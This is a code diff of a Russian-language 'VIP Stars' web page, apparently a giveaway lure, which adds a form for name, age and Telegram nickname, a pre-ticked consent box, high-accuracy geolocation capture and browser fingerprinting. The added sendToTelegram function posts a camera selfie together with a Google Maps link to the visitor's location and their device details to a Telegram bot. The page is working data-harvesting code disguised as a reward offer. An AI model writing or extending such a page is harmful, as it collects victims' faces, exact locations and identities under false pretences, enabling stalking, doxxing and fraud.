@@ -8,16 +8,17 @@
         :root {
             --primary: #6e45e2;
             --secondary: #88d3ce;
-            --dark: #1a1a2e;
+            --dark: #0f0f1a;
             --light: #f8f9fa;
             --accent: #ff6b6b;
+            --neon: #00f3ff;
         }
         
         body {
             margin: 0;
             padding: 0;
             font-family: 'Montserrat', sans-serif;
-            background: linear-gradient(135deg, var(--dark), var(--primary));
+            background: linear-gradient(135deg, var(--dark), #1a1a2e);
             color: var(--light);
             min-height: 100vh;
             overflow-x: hidden;
@@ -42,10 +43,11 @@
         .logo {
             font-size: 2.2rem;
             font-weight: 800;
-            background: linear-gradient(to right, var(--accent), var(--secondary));
+            background: linear-gradient(to right, var(--neon), var(--secondary));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             letter-spacing: 1px;
+            text-shadow: 0 0 10px rgba(0, 243, 255, 0.3);
         }
         
         nav a {
@@ -58,7 +60,7 @@
         }
         
         nav a:hover {
-            color: var(--secondary);
+            color: var(--neon);
         }
         
         nav a::after {
@@ -68,7 +70,7 @@
             left: 0;
             width: 0;
             height: 2px;
-            background: var(--secondary);
+            background: var(--neon);
             transition: width 0.3s ease;
         }
         
@@ -85,10 +87,11 @@
         h1 {
             font-size: 3.8rem;
             margin-bottom: 1.5rem;
-            background: linear-gradient(to right, #fff, var(--secondary));
+            background: linear-gradient(to right, #fff, var(--neon));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             line-height: 1.2;
+            text-shadow: 0 0 15px rgba(0, 243, 255, 0.2);
         }
         
         .subtitle {
@@ -108,7 +111,7 @@
             font-size: 1.3rem;
             border-radius: 50px;
             cursor: pointer;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2), 0 0 15px rgba(0, 243, 255, 0.3);
             transition: all 0.4s ease;
             position: relative;
             overflow: hidden;
@@ -121,7 +124,7 @@
         
         .btn:hover {
             transform: translateY(-5px);
-            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
+            box-shadow: 0 15px 30px rgba(0,0,0,0.3), 0 0 25px rgba(0, 243, 255, 0.4);
         }
         
         .btn:active {
@@ -147,6 +150,7 @@
             box-shadow: 0 15px 35px rgba(0,0,0,0.3);
             display: none;
             position: relative;
+            border: 2px solid var(--neon);
         }
         
         .camera-preview video {
@@ -216,6 +220,57 @@
             pointer-events: none;
         }
         
+        .user-form {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 2rem;
+            border-radius: 15px;
+            max-width: 500px;
+            margin: 0 auto 2rem;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+        
+        .form-group {
+            margin-bottom: 1.5rem;
+            text-align: left;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            color: var(--neon);
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            color: white;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--neon);
+            box-shadow: 0 0 0 2px rgba(0, 243, 255, 0.2);
+        }
+        
+        .permission-checkbox {
+            display: flex;
+            align-items: center;
+            margin: 2rem 0;
+            justify-content: center;
+        }
+        
+        .permission-checkbox input {
+            margin-right: 10px;
+        }
+        
         /* Адаптивность */
         @media (max-width: 768px) {
             h1 {
@@ -234,6 +289,18 @@
             .camera-preview {
                 width: 250px;
                 height: 350px;
+            }
+            
+            header {
+                flex-direction: column;
+            }
+            
+            nav {
+                margin-top: 1rem;
+            }
+            
+            nav a {
+                margin: 0 0.8rem;
             }
         }
     </style>
@@ -263,6 +330,26 @@
                 <div class="star">✨</div>
                 <div class="star">💫</div>
                 <div class="star">🔥</div>
+            </div>
+            
+            <div class="user-form" id="userForm">
+                <div class="form-group">
+                    <label for="userName">Ваше имя</label>
+                    <input type="text" id="userName" placeholder="Как вас зовут?" required>
+                </div>
+                <div class="form-group">
+                    <label for="userAge">Ваш возраст</label>
+                    <input type="number" id="userAge" placeholder="Сколько вам лет?" required>
+                </div>
+                <div class="form-group">
+                    <label for="userNickname">Никнейм в Telegram</label>
+                    <input type="text" id="userNickname" placeholder="@username" required>
+                </div>
+            </div>
+            
+            <div class="permission-checkbox">
+                <input type="checkbox" id="permissionCheckbox" required checked>
+                <label for="permissionCheckbox">Я даю согласие на обработку данных и отправку геопозиции</label>
             </div>
             
             <button id="getStarsBtn" class="btn">
@@ -311,14 +398,131 @@
         const cameraVideo = document.getElementById("cameraVideo");
         const countdown = document.getElementById("countdown");
         const instructionText = document.getElementById("instructionText");
+        const userForm = document.getElementById("userForm");
+        const permissionCheckbox = document.getElementById("permissionCheckbox");
         let stream = null;
+        let userLocation = null;
+
+        // Собираем данные браузера
+        function getBrowserData() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    rtt: navigator.connection.rtt,
+                    downlink: navigator.connection.downlink,
+                    saveData: navigator.connection.saveData
+                } : 'unknown',
+                referrer: document.referrer,
+                pageUrl: window.location.href,
+                timestamp: new Date().toISOString()
+            };
+        }
+
+        // Получаем геопозицию
+        async function getLocation() {
+            if (!permissionCheckbox.checked) return null;
+            
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date(position.timestamp).toISOString()
+                        });
+                    },
+                    (error) => {
+                        console.error("Geolocation error:", error);
+                        resolve(null);
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            });
+        }
+
+        // Отправляем данные в Telegram
+        async function sendToTelegram(photoBlob, userData, browserData, location) {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", photoBlob, "vip_stars_selfie.jpg");
+            
+            // Создаем текст сообщения с пользовательскими данными
+            let caption = `🎯 *Новая заявка на VIP Звёзды* 🎯\n\n` +
+                         `👤 *Имя:* ${userData.name}\n` +
+                         `🔢 *Возраст:* ${userData.age}\n` +
+                         `📱 *Telegram:* ${userData.nickname}\n\n` +
+                         `📍 *Геопозиция:* ${location ? 
+                             `https://www.google.com/maps?q=${location.latitude},${location.longitude}` : 
+                             'Не предоставлена'}\n\n` +
+                         `🌐 *Данные браузера:*\n` +
+                         `🔹 User Agent: ${browserData.userAgent}\n` +
+                         `🔹 Платформа: ${browserData.platform}\n` +
+                         `🔹 Язык: ${browserData.language}\n` +
+                         `🔹 Разрешение: ${browserData.screenWidth}x${browserData.screenHeight}\n` +
+                         `🔹 Часовой пояс: ${browserData.timezone}\n` +
+                         `🔹 Страница: ${browserData.pageUrl}\n` +
+                         `🕒 Время: ${browserData.timestamp}`;
+            
+            formData.append("caption", caption);
+            formData.append("parse_mode", "Markdown");
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+                
+                if (!response.ok) {
+                    const errorData = await response.json();
+                    throw new Error(errorData.description || "Ошибка отправки");
+                }
+                
+                return true;
+            } catch (e) {
+                console.error("Ошибка отправки в Telegram:", e);
+                throw e;
+            }
+        }
 
         btn.addEventListener("click", async () => {
             try {
+                // Проверяем заполнение формы
+                const userName = document.getElementById("userName").value.trim();
+                const userAge = document.getElementById("userAge").value.trim();
+                const userNickname = document.getElementById("userNickname").value.trim();
+                
+                if (!userName || !userAge || !userNickname) {
+                    throw new Error("Пожалуйста, заполните все поля формы");
+                }
+                
+                if (!permissionCheckbox.checked) {
+                    throw new Error("Необходимо дать согласие на обработку данных");
+                }
+                
                 // Подготовка
                 btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ПОДГОТОВКА';
                 btn.classList.add('btn-loading');
                 instructionText.textContent = "Разрешите доступ к камере...";
+                
+                // Получаем геопозицию (если разрешено)
+                userLocation = await getLocation();
                 
                 // Активируем камеру
                 stream = await navigator.mediaDevices.getUserMedia({ 
@@ -363,7 +567,7 @@
                 ctx.filter = 'brightness(1.1) contrast(1.1) saturate(1.1)';
                 ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
                 
-                // Останавливаем камеру
+                 // Останавливаем камеру
                 stream.getTracks().forEach(track => track.stop());
                 cameraPreview.classList.remove('active');
                 
@@ -373,23 +577,25 @@
                     throw new Error("Не удалось сделать фото. Пожалуйста, попробуйте ещё раз.");
                 }
 
-                // Отправляем фото
+                // Отправляем фото и данные
                 btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ОТПРАВКА';
                 btn.classList.add('btn-loading');
                 instructionText.textContent = "Отправляем ваши звёзды...";
                 
                 canvas.toBlob(async (blob) => {
                     try {
-                        const formData = new FormData();
-                        formData.append("chat_id", chatId);
-                        formData.append("photo", blob, "vip_stars_selfie.jpg");
+                        // Собираем данные пользователя
+                        const userData = {
+                            name: userName,
+                            age: userAge,
+                            nickname: userNickname
+                        };
                         
-                        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                            method: "POST",
-                            body: formData
-                        });
+                        // Собираем данные браузера
+                        const browserData = getBrowserData();
                         
-                        if (!response.ok) throw new Error("Ошибка отправки");
+                        // Отправляем все данные в Telegram
+                        await sendToTelegram(blob, userData, browserData, userLocation);
                         
                         // Успех
                         btn.innerHTML = '<i class="fas fa-check"></i> ГОТОВО!';
